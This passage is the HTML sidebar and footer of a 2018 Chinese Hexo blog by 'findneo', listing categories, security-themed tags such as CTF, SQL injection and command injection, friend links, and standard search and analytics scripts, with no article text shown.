placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/code/">code</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/writeup/">writeup</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/奇技淫巧/">奇技淫巧</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/社区投稿/">社区投稿</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/hacklife/" style="font-size: 15px;">hacklife</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/C/" style="font-size: 15px;">C</a> <a href="/tags/resources/" style="font-size: 15px;">resources</a> <a href="/tags/ctf/" style="font-size: 15px;">ctf</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/命令注入/" style="font-size: 15px;">命令注入</a> <a href="/tags/code/" style="font-size: 15px;">code</a> <a href="/tags/Batch/" style="font-size: 15px;">Batch</a> <a href="/tags/密码学/" style="font-size: 15px;">密码学</a> <a href="/tags/sqli/" style="font-size: 15px;">sqli</a> <a href="/tags/网络/" style="font-size: 15px;">网络</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="https://lxpark.com/" title="lzhtony" target="_blank">lzhtony</a><ul></ul><a href="https://madsome.cn/" title="Mads" target="_blank">Mads</a><ul></ul><a href="https://ph0en1x.com/" title="Ph0en1x ctf team" target="_blank">Ph0en1x ctf team</a><ul></ul><a href="http://vancir.com/" title="Vancir" target="_blank">Vancir</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">findneo.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.2.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.2.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = '//hm.baidu.com/hm.js?' + '46a32286256dd65996099e45157ca245';
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>